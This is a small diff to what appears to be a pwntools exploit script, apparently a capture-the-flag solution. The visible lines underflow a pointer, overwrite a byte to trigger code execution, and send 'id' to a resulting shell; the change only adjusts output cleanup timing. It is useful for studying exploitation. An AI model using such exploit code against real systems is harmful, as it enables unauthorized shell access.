@@ -29,9 +29,7 @@ r.send('\\' * (ptr-off_ptr-3))  # Underflow PTR, -3 so we set the high byte.
 r.send('\xca')                  # Write the byte
 r.send('\\')                    # Move backward again to undo the ++
 r.send('\xca')                  # Send any byte at all, triggers e()
-r.clean()
-
-time.sleep(1)
+r.clean(2)
 
 # Win
 r.send('id\n')
